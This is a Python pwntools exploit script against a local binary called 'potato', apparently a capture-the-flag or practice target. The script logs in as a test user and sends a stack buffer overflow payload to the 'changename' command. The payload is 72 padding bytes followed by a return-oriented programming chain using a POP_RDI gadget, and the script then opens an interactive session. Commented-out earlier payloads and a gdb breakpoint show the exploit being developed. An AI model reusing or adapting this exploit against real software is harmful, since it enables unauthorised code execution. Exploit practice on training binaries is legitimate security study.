#!/usr/bin/env python3

from pwn import *
import sys

elf = ELF("./potato")
# context.binary = elf
# context.arch = 'i386'
# context.bits = 32
# context.endian = 'little'
# context.os = 'linux'

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break func.c:191
continue
''')

POP_RDI = 0x155554c34205

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# # test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username
# logged in
#p.interactive()
p.sendline(b"changename")
# input for funcsudo apt-get install libssl-dev:i386
#payload=b"paul"
#payload=b"\x41"*600
#payload=b"\xAA\xAA\xAA\xAA\xAA\x7f\x00\x00"*300
#payload=b"\x66\xb9\x09\x17\x1c\x56\x00\x00"*300
#payload=cyclic(300)
#payload=b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf"
# payload=b"\x41"*72 + p64(0x4045ca)
# payload=b"\x41"*72 + p64(0x4040e4) + p64(0x40343d) +  p64(0x4034c9)
# payload = b"\x41"*72 + p64(0x403866)
# payload=b"\x41"*72 + p64(0x4040e4) + p64(0x403778) +  p64(0x4051da)
payload=b"\x41"*72 + p64(0x4040e4) + p64(POP_RDI) + p64(0x4051da) + p64(0x403778) 


p.sendline(payload)
#p.recvline_startswith(b"cmd>")
#p.sendline(b"whoami")

#with open("payload", "wb") as f: f.write(payload)
#print(p.recvuntil(b": ", timeout=1)) # password
#p.sendline(b"")
#print(p.recvall(timeout=1))

p.interactive()
